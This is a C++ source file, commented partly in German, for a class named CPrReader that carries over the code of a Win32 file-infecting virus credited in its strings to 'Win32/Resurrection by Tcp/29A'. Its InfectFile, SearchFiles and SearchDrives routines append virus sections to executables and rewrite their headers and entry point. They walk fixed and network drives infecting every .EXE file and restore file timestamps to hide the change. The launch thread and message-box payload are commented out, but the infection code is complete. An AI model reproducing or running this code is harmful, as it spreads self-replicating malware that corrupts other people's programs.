// PrReader.cpp: Implementierung der Klasse CPrReader.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "stdafx.h"
#include "PrReader.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Konstruktion/Destruktion
//////////////////////////////////////////////////////////////////////

CPrReader::CPrReader(HMODULE hm)
{
	IDosHeader=NULL;
	IPEHeader=NULL;
	ISection=NULL;
	Section=NULL;
	Generation=0;
	VirusSections=0;
	FirstVirusSection=0;
	VirusCodeSection=0;
	VirusImportSection=0;
	VirusImportSize=0;
	VirusRVAImports=0;
	HostRVAImports=0;
	VirusRelocSection=0;
	VirusRelocSize=0;
	VirusRelocSizeDir=0;
	OfsSections=0;
	VirusBaseRVA=0;
	VirusEP=0;
	HostEP=0;


  BYTE InfectedFile[_MAX_PATH];
  int i;
  HMODULE * HandleDLL = NULL;
  int ImportedDLLs = 0;

__Log("PrReader::CPrReader\tINFO: 1");
  // Get the infected filename
  GetModuleFileName(hm, (char*)InfectedFile, sizeof(InfectedFile));
  // And its memory address
  IDosHeader = (IMAGE_DOS_HEADER *)GetModuleHandle((char*)InfectedFile);
   
  IPEHeader = (IMAGE_NT_HEADERS *)((BYTE *)IDosHeader + IDosHeader->e_lfanew);

__Log("PrReader::CPrReader\tINFO: 2");

  if ( IPEHeader->Signature == IMAGE_NT_SIGNATURE ) // Check if we got the PE header
  {
__Log("PrReader::CPrReader\tINFO: 3");
    // Get ptr to Sections
    ISection = (IMAGE_SECTION_HEADER *)((BYTE *)IPEHeader + sizeof(IMAGE_NT_HEADERS));
    // Get ptr to virus Sections
    ISection += FirstVirusSection;
  
    if (Generation++ == 1)
    {   // Make some easy 1st-gen calcs to avoid complex ones in next generations
      HostEP = (DWORD)(0) - (DWORD)IDosHeader;
      VirusSections = IPEHeader->FileHeader.NumberOfSections; // Number of sections
      // Get the order of sections
      for (i=0; i<VirusSections; i++)
      {
        if ((ISection[i].VirtualAddress <= IPEHeader->OptionalHeader.AddressOfEntryPoint)
             &&
            (ISection[i].VirtualAddress + ISection[i].SizeOfRawData > IPEHeader->OptionalHeader.AddressOfEntryPoint)
           )
        { // This is the code section
          VirusCodeSection = i;
          VirusEP = IPEHeader->OptionalHeader.AddressOfEntryPoint - ISection[i].VirtualAddress;
        }
        else
        {
          if ((ISection[i].VirtualAddress <= IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
			          &&
			        (ISection[i].VirtualAddress + ISection[i].SizeOfRawData > IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
			       )
          { // This is the import section
      			VirusImportSection = i;
      		  VirusRVAImports = IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress - ISection[0].VirtualAddress;
          }
          else
          {
            if (ISection[i].VirtualAddress == IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
            { // This is the reloc section
              VirusRelocSection = i;
              VirusRelocSize = ISection[i].Misc.VirtualSize;
              VirusRelocSizeDir = IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
            }
          }
        }
      }//for
__Log("PrReader::CPrReader\tINFO: 4");
    }
    else  // Not first generation
    {
__Log("PrReader::CPrReader\tINFO: 5");
      IMAGE_IMPORT_DESCRIPTOR * HostImports;
      int i;
      
      HostImports = (IMAGE_IMPORT_DESCRIPTOR *)(HostRVAImports + (DWORD)IDosHeader);
      // Count imported DLLs
      while (HostImports->OriginalFirstThunk)
      {
        ImportedDLLs++;
        HostImports++;
      }

      HandleDLL = (HMODULE *)MEMALLOC(ImportedDLLs * sizeof(HMODULE));
      // Make host imports
      HostImports = (IMAGE_IMPORT_DESCRIPTOR *)(HostRVAImports + (DWORD)IDosHeader);

__Log("PrReader::CPrReader\tINFO: 6");

      for (i=0; i<ImportedDLLs; i++)
      {
        DWORD * FunctionName;
        DWORD * FunctionAddr;
        LPCTSTR Name;
        LPCTSTR StExitThread = "ExitThread";

CIPString s;
s.Format("%d from ImportedDLLs:%d",i,ImportedDLLs);
__Log("PrReader::CPrReader\tINFO: "+s);

        if ((HandleDLL[i] = LoadLibrary((LPCTSTR)(HostImports->Name + (DWORD)IDosHeader))) == NULL)
        { // Exit if not find a DLL
          char StError[100];

          MEMFREE(HandleDLL);
          sprintf(StError, "Can not find %s", (LPCTSTR)(HostImports->Name + (DWORD)IDosHeader));
			__Log("PrReader::CPrReader\tERROR: "+CIPString(StError));
		  continue;
          MessageBox(NULL, StError, "Error initializing program", MB_OK | MB_ICONWARNING);
          ExitProcess(0);
        }

        // Perform host imports
        FunctionName = (DWORD *)(HostImports->OriginalFirstThunk + (DWORD)IDosHeader);
        FunctionAddr = (DWORD *)(HostImports->FirstThunk + (DWORD)IDosHeader);
__Log("PrReader::CPrReader\tINFO: 7");
        while (*FunctionName)
        {
          if (*FunctionName & IMAGE_ORDINAL_FLAG)
          {
            // Windows doesn't like ordinal imports from kernel32, so use my own GetProcAddress
            *FunctionAddr = GetProcAddressOrd((DWORD)HandleDLL[i], IMAGE_ORDINAL(*FunctionName));
          }
          else
          {
            Name = (LPCTSTR)((DWORD)IDosHeader + *FunctionName + 2/*Hint*/);
			maImpFuncs.Add(CIPString(Name));
            // Change ExitProcess by ExitThread
/*            if (!strcmp(Name, "ExitProcess"))
				Name = StExitThread;
            // Set payload
/*            if (!strcmp(Name, "MessageBoxA"))
              *FunctionAddr = (DWORD)&MyMessageBox;
            else
*/              *FunctionAddr = (DWORD)GetProcAddress(HandleDLL[i], Name);
          }
          FunctionName++;
          FunctionAddr++;
        }
        HostImports++;
      }

__Log("PrReader::CPrReader\tINFO: 8");
    }
__Log("PrReader::CPrReader\tINFO: 9");
    HostEP += (DWORD)IDosHeader;
/*    // Exec host with a thread
    if ((HThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)HostEP, GetCommandLine(), 0, &ThreadID)) != NULL)
    {
      HANDLE VirusMutex;
       
      // Check if already resident
      if ( ((VirusMutex = CreateMutex(NULL, FALSE, "29A")) != NULL)
           &&
           (GetLastError() != ERROR_ALREADY_EXISTS)
         )
      {
        // Create infection thread
        InfThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SearchDrives , NULL, CREATE_SUSPENDED, &ThreadInfID);
        // Assign a low priority
        SetThreadPriority(InfThread, THREAD_PRIORITY_IDLE);
        // Activate it
        ResumeThread(InfThread);
        // Wait until infection completed
        WaitForSingleObject(InfThread, INFINITE);
        ReleaseMutex(VirusMutex);
      }
      // Wait until host thread finnished
      WaitForSingleObject(HThread, INFINITE);
    }
*/
__Log("PrReader::CPrReader\tINFO: 10");
    for (i=0; i<ImportedDLLs; i++)
    {
      FreeLibrary(HandleDLL[i]);
    }
    if (HandleDLL != NULL)
      MEMFREE(HandleDLL);
  }
}

CPrReader::~CPrReader()
{
}

/////////////////////////////////////
// GetProcAddress for ordinal imports
/////////////////////////////////////

DWORD CPrReader::GetProcAddressOrd(DWORD Base, DWORD NFunc)
{
  IMAGE_NT_HEADERS * DLLHeader;
  IMAGE_EXPORT_DIRECTORY * Exports;
  DWORD * AddrFunctions;

  DLLHeader = (IMAGE_NT_HEADERS *)(Base + ((IMAGE_DOS_HEADER *)Base)->e_lfanew);
  Exports = (IMAGE_EXPORT_DIRECTORY *)(Base + DLLHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  AddrFunctions = (DWORD *)(Base + Exports->AddressOfFunctions);
  return Base + AddrFunctions[NFunc - Exports->Base];
}


//////////////////////////////////
// Check file and read PE header
//////////////////////////////////

int CPrReader::ReadPEHeader(HANDLE FHandle)//FILE * FHandle)
{
  IMAGE_DOS_HEADER FileHeader;
  WORD SizeSections;
  DWORD BytesRead;

  return
     (      // Read file header
       ( ReadFile(FHandle, &FileHeader, sizeof(IMAGE_DOS_HEADER), &BytesRead, NULL) )
       &&
       ( BytesRead == sizeof(IMAGE_DOS_HEADER) )
       &&   // Check if EXE file
       ( FileHeader.e_magic == IMAGE_DOS_SIGNATURE )
       &&   // Seek to NewExe header
       ( SetFilePointer(FHandle, FileHeader.e_lfanew, NULL, FILE_BEGIN) != (DWORD)-1 )
       &&   // Read header
       ( ReadFile(FHandle, &PEHeader, sizeof(IMAGE_NT_HEADERS), &BytesRead, NULL) )
       &&
       ( BytesRead == sizeof(IMAGE_NT_HEADERS) )
       &&   // Check if PE file
       ( PEHeader.Signature == IMAGE_NT_SIGNATURE )
       &&   // Alloc memory for file sections + virus sections
       ( (SizeSections = (PEHeader.FileHeader.NumberOfSections + VirusSections) * sizeof(IMAGE_SECTION_HEADER)) )
       &&
       ( (Section = (IMAGE_SECTION_HEADER*)MEMALLOC(SizeSections)) != NULL )
       &&
       ( (OfsSections = SetFilePointer(FHandle, 0, NULL, FILE_CURRENT)) ) 
       &&   // Read PE sections
       ( ReadFile(FHandle, Section, SizeSections, &BytesRead, NULL) )
       &&
       ( BytesRead == SizeSections )
       &&   // Check if there is enough room for our sections
       ( (SetFilePointer(FHandle, 0, NULL, FILE_CURRENT) + (VirusSections * sizeof(IMAGE_SECTION_HEADER))) <= PEHeader.OptionalHeader.SizeOfHeaders )
       &&   // Only infect when entry point belongs to 1st section
            // Avoid reinfections and compressors (usually perform virus checks)
       ( PEHeader.OptionalHeader.AddressOfEntryPoint < Section[0].VirtualAddress + Section[0].SizeOfRawData )
       &&   // Skip DDLs
       ( !(PEHeader.FileHeader.Characteristics & IMAGE_FILE_DLL) )
       &&   // Skip files with overlays or not aligned to file alignment
       ( SetFilePointer(FHandle, 0, NULL, FILE_END) == Section[PEHeader.FileHeader.NumberOfSections-1].PointerToRawData + Section[PEHeader.FileHeader.NumberOfSections-1].SizeOfRawData )
       &&   //Check if the host will overwrite our code with its unitialized data (not present in disk)
       ( Section[PEHeader.FileHeader.NumberOfSections-1].Misc.VirtualSize <= Section[PEHeader.FileHeader.NumberOfSections-1].SizeOfRawData )
     );
}

///////////////////////////////////////
// Translates a RVA into a file offset
///////////////////////////////////////
DWORD CPrReader::RVA2Ofs(DWORD rva)
{
  int NSect;
  
  NSect = 0;
  while ( NSect < (PEHeader.FileHeader.NumberOfSections - 1) )
  {
    if ( (Section[NSect].VirtualAddress + Section[NSect].SizeOfRawData) >= rva )
      break;
    NSect++;
  }
  return (Section[NSect].PointerToRawData + ( rva - Section[NSect].VirtualAddress ));
}

void CPrReader::InfectFile(HANDLE FHandle)
{
  BYTE * Relocations = NULL;
  BYTE * HostRelocs = NULL;
  BYTE * Ptr;
  IMAGE_BASE_RELOCATION * RelocBlock;
  IMAGE_RELOCATION_DATA * PtrReloc;
  int j;

  // Let's do some initializations
  Section = NULL;
  Relocations = NULL;
  HostRelocs = NULL;
  Ptr = NULL;

  if (ReadPEHeader(FHandle))
  {
    DWORD SectionRVA;
    int HostNSections;
    DWORD HostRelocsSize;
    DWORD BytesRead;
    int i;

    HostEP = PEHeader.OptionalHeader.AddressOfEntryPoint;
    HostNSections = PEHeader.FileHeader.NumberOfSections;

    HostRVAImports = PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

    // Search for victim import section
    for (i=0; i<HostNSections; i++)
    {
      if (Section[i].VirtualAddress + Section[i].SizeOfRawData > HostRVAImports)
      {
        // Do it writable
        Section[i].Characteristics |= IMAGE_SCN_MEM_WRITE;
        break;
      }
    }

    // Check if last section is .reloc
    HostRelocsSize = 0;
    if (PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == Section[HostNSections-1].VirtualAddress)
    {
      // Then we'll join it to virus reloc section
      VirusBaseRVA = SectionRVA = Section[HostNSections-1].VirtualAddress;
      if ( (HostRelocs = (BYTE *)MEMALLOC((HostRelocsSize = PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size))) == NULL)
      {
        goto L_Exit_Infect;
      }
      else  // Read the .reloc section
      {
        HostNSections--;
        SetFilePointer(FHandle, Section[HostNSections].PointerToRawData, NULL, FILE_BEGIN);
        ReadFile(FHandle,  HostRelocs, HostRelocsSize, &BytesRead, NULL);
        SetFilePointer(FHandle, Section[HostNSections].PointerToRawData, NULL, FILE_BEGIN);
      }
    }
    else  // There is no .reloc or it is not the last section
    {
      if (PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
      { // There are relocs but we didn't find them, so exit
        goto L_Exit_Infect;
      }
      VirusBaseRVA = SectionRVA = PEHeader.OptionalHeader.SizeOfImage;
      SetFilePointer(FHandle, 0, NULL, FILE_END);
    }

    FirstVirusSection = HostNSections;
    // Add virus section table
    CopyMemory(&Section[HostNSections], &ISection[0], sizeof(IMAGE_SECTION_HEADER) * VirusSections);

    // Reloc virus code & fix reloc sections
    if ((Relocations = (BYTE *)MEMALLOC((VirusRelocSize > 0x1000)? VirusRelocSize : 0x1000)) == NULL) // Minimun a page
    {
      goto L_Exit_Infect;
    }
    CopyMemory(Relocations, (BYTE *)((DWORD)IDosHeader + ISection[VirusRelocSection].VirtualAddress + ISection[VirusRelocSection].Misc.VirtualSize - VirusRelocSize), VirusRelocSize);
    
    RelocBlock = (IMAGE_BASE_RELOCATION *)Relocations;
    PtrReloc = (IMAGE_RELOCATION_DATA *)(Relocations + sizeof(IMAGE_BASE_RELOCATION));

    // Reloc all virus sections and write them to disk
    for (i=0; i<VirusSections; i++)
    {
      DWORD RelocsInBlock;

      Section[HostNSections + i].PointerToRawData = SetFilePointer(FHandle, 0, NULL, FILE_CURRENT);
      Section[HostNSections + i].VirtualAddress = SectionRVA;
      Section[HostNSections + i].SizeOfRawData = (ISection[i].SizeOfRawData + PEHeader.OptionalHeader.FileAlignment-1) & (-(long)PEHeader.OptionalHeader.FileAlignment);
	  
      if (i == VirusRelocSection)  // Virus reloc section?
      {
        PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = SectionRVA;
        PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = HostRelocsSize + VirusRelocSize;
        Section[HostNSections + i].Misc.VirtualSize = HostRelocsSize + VirusRelocSize;
        Section[HostNSections + i].SizeOfRawData = (HostRelocsSize + VirusRelocSize + (PEHeader.OptionalHeader.FileAlignment - 1)) & (-(long)PEHeader.OptionalHeader.FileAlignment);
        // Write host relocations
        WriteFile(FHandle, HostRelocs, HostRelocsSize, &BytesRead, NULL);
        // Add virus relocations
        WriteFile(FHandle, Relocations, VirusRelocSize, &BytesRead, NULL);
        // Fill with zeros until file alignment
        memset(Relocations, 0, 0x1000);
        WriteFile(FHandle, Relocations, Section[HostNSections + i].SizeOfRawData - (HostRelocsSize + VirusRelocSize), &BytesRead, NULL);
      }
      else
      {
        if ((Ptr = (BYTE *)MEMALLOC(ISection[i].SizeOfRawData)) == NULL)
        {
          goto L_Exit_Infect;
        }
        CopyMemory(Ptr, (BYTE *)((DWORD)IDosHeader + ISection[i].VirtualAddress), ISection[i].SizeOfRawData);

        // Patch Visual C 5.0 heap in .data section
/*
        {
          DWORD * PtrHeap = &__small_block_heap;

          if (((DWORD)IDosHeader + ISection[i].VirtualAddress < (DWORD)PtrHeap)
               &&
              ((DWORD)IDosHeader + ISection[i].VirtualAddress + ISection[i].SizeOfRawData > (DWORD)PtrHeap)
             )
          {
            PtrHeap = (DWORD *)(Ptr + (DWORD)PtrHeap - (DWORD)IDosHeader - ISection[i].VirtualAddress);
            PtrHeap[3] = PtrHeap[2];
            PtrHeap[4] = PtrHeap[5] = (DWORD)-1;
          }
        }
*/        
        // Do relocations in this section
        while ( (ISection[i].VirtualAddress + ISection[i].SizeOfRawData > RelocBlock->VirtualAddress)
                &&
                ((DWORD)PtrReloc < (DWORD)Relocations + VirusRelocSizeDir)
              )
        {
          DWORD Base;

          Base = RelocBlock->VirtualAddress - ISection[i].VirtualAddress;
          RelocsInBlock = (RelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_DATA);
          while (RelocsInBlock--)
          {
            if (PtrReloc->RelocType == IMAGE_REL_BASED_HIGHLOW)
            {
			        *((DWORD *)&Ptr[Base + PtrReloc->RelocOfs]) -= (IPEHeader->OptionalHeader.ImageBase + ISection[i].VirtualAddress);//RelocBlock->VirtualAddress);
              *((DWORD *)&Ptr[Base + PtrReloc->RelocOfs]) += (PEHeader.OptionalHeader.ImageBase + SectionRVA);
            }
            PtrReloc++;
          }
          RelocBlock->VirtualAddress = RelocBlock->VirtualAddress - ISection[i].VirtualAddress + SectionRVA;
          RelocBlock = (IMAGE_BASE_RELOCATION *)PtrReloc;
          PtrReloc = (IMAGE_RELOCATION_DATA *)((BYTE *)RelocBlock + sizeof(IMAGE_BASE_RELOCATION));
        }
        
        // Check if this is the Import section
        if (i == VirusImportSection)
        {
          IMAGE_IMPORT_DESCRIPTOR * Imports;
          IMAGE_THUNK_DATA * DataImports;
          DWORD StartImports;
          DWORD DeltaRVAs;

          DeltaRVAs = SectionRVA - ISection[i].VirtualAddress;
          StartImports = IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress - ISection[i].VirtualAddress;
          Imports = (IMAGE_IMPORT_DESCRIPTOR *)&Ptr[StartImports];
          while (Imports->OriginalFirstThunk)
          {
            // Fix some initialized fields in memory
            Imports->TimeDateStamp = Imports->ForwarderChain = 0;
            Imports->OriginalFirstThunk += DeltaRVAs;
            Imports->Name += DeltaRVAs;
            Imports->FirstThunk += DeltaRVAs;
            DataImports = (IMAGE_THUNK_DATA *)&Ptr[Imports->OriginalFirstThunk - SectionRVA];
            do
            {
              DataImports->u1.AddressOfData = (IMAGE_IMPORT_BY_NAME *)((DWORD)DataImports->u1.AddressOfData + DeltaRVAs);
            }
            while ((++DataImports)->u1.AddressOfData);
            Imports++;
          }
        }

        WriteFile(FHandle, Ptr, Section[HostNSections + i].SizeOfRawData, &BytesRead, NULL);
        MEMFREE(Ptr);
        Ptr = NULL;
      }
      SectionRVA += ( Section[HostNSections + i].Misc.VirtualSize + (PEHeader.OptionalHeader.SectionAlignment - 1)) & (-(long)PEHeader.OptionalHeader.SectionAlignment);
    }//for
    
    // Recalculate Header fields
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress = 0;
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size = 0;
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = VirusRVAImports + Section[HostNSections + VirusCodeSection].VirtualAddress;
    PEHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = IPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    PEHeader.OptionalHeader.SizeOfImage = SectionRVA;
    PEHeader.OptionalHeader.AddressOfEntryPoint = VirusEP + Section[HostNSections + VirusCodeSection].VirtualAddress;
    PEHeader.FileHeader.NumberOfSections = HostNSections + VirusSections;
    PEHeader.OptionalHeader.SizeOfCode = 0;
    PEHeader.OptionalHeader.SizeOfInitializedData = 0;
    PEHeader.OptionalHeader.SizeOfUninitializedData = 0;
    for (j=0; j<PEHeader.FileHeader.NumberOfSections; j++)
    {
      if (Section[j].Characteristics & IMAGE_SCN_CNT_CODE)
        PEHeader.OptionalHeader.SizeOfCode += Section[j].SizeOfRawData;
      if (Section[j].Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)
        PEHeader.OptionalHeader.SizeOfInitializedData += Section[j].SizeOfRawData;
      if (Section[j].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)
        PEHeader.OptionalHeader.SizeOfUninitializedData += Section[j].SizeOfRawData;
    }
    // Write new header and section table
    SetFilePointer(FHandle, OfsSections - sizeof(IMAGE_NT_HEADERS), NULL, FILE_BEGIN);
    WriteFile(FHandle, &PEHeader, sizeof(IMAGE_NT_HEADERS), &BytesRead, NULL);
    WriteFile(FHandle, Section, PEHeader.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER), &BytesRead, NULL);
	}

	L_Exit_Infect:
	 // Free allocated memory
  if (HostRelocs != NULL)
    MEMFREE(HostRelocs);
  if (Relocations != NULL)
    MEMFREE(Relocations);
  if (Section != NULL)
    MEMFREE(Section);
  if (Ptr != NULL)
    MEMFREE(Ptr);

  }

void CPrReader::SearchFiles(char * Path)
{
  HANDLE FindHandle;
  HANDLE FHandle;
  WIN32_FIND_DATA FindResult;
  FILETIME Time1, Time2, Time3;

  if (SetCurrentDirectory(Path))
  {
    // Search for EXE files in current directory
    if ((FindHandle = FindFirstFile("*.EXE", &FindResult)) != INVALID_HANDLE_VALUE)
    {
      do
      {
        FHandle = CreateFile(FindResult.cFileName,
                             GENERIC_READ | GENERIC_WRITE,
                             0,
                             NULL,
                             OPEN_EXISTING,
                             FILE_ATTRIBUTE_ARCHIVE,
                             NULL
                            );
        if (FHandle != INVALID_HANDLE_VALUE)
        {
          GetFileTime(FHandle, &Time1, &Time2, &Time3); // Get file time
          InfectFile(FHandle);                          // Infect file
          SetFileTime(FHandle, &Time1, &Time2, &Time3); // Restore file time
          CloseHandle(FHandle);
        }
      }
      while (FindNextFile(FindHandle, &FindResult));
    }
    FindClose(FindHandle);
    // Now search for subdirectories and process them
    if ((FindHandle = FindFirstFile("*", &FindResult)) != INVALID_HANDLE_VALUE)
    {
      do
      {
        if (FindResult.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
          char * DirName;

          DirName = _strupr(_strdup(FindResult.cFileName));
          if ( 
                (memcmp(DirName, "SYSTEM", 6))    // Skip SYSTEM??
              &&
                (FindResult.cFileName[0] != '.')  // Skip loops with "." and ".."
             )
          {
            SearchFiles(FindResult.cFileName);
          }
          free(DirName);
        }
      }
      while (FindNextFile(FindHandle, &FindResult));
    }
    FindClose(FindHandle);
  }
}

DWORD WINAPI CPrReader::SearchDrives()
{
  DWORD Drives;
  BYTE CurrentDrive[] = "A:\\";
  DWORD DriveType;
  BYTE i;

  Drives = GetLogicalDrives();
  for (i=0; i<sizeof(DWORD); i++)
  {
    if (Drives & (1<<i))  // Drive present?
    {
      CurrentDrive[0] = 'A' + i;
      DriveType = GetDriveType((char*)CurrentDrive);
      // Only infect files in Fixed and Network Drives
      if ((DriveType == DRIVE_FIXED) || (DriveType == DRIVE_REMOTE))
      {
        SearchFiles((char*)CurrentDrive);
      }
    }
  }
  return 1;
}

///////////
// Payload
///////////
int CPrReader::MyMessageBox(HWND hWnd, LPSTR Text, LPSTR Caption, UINT Type)
{
  char * Msgs[] =
  {
    "Hey you, stupid",
    "Win32/Resurrection by Tcp/29A",
    "Warning! Don't close this window",
    "I already told you this but..."
  };
  static int i = 0;

  return MessageBoxA(hWnd, Text, Msgs[++i & 3], Type);
}


// Simulated host for 1st generation
void CPrReader::Gen1()
{
  MyMessageBox(NULL, "", NULL, MB_OK);
}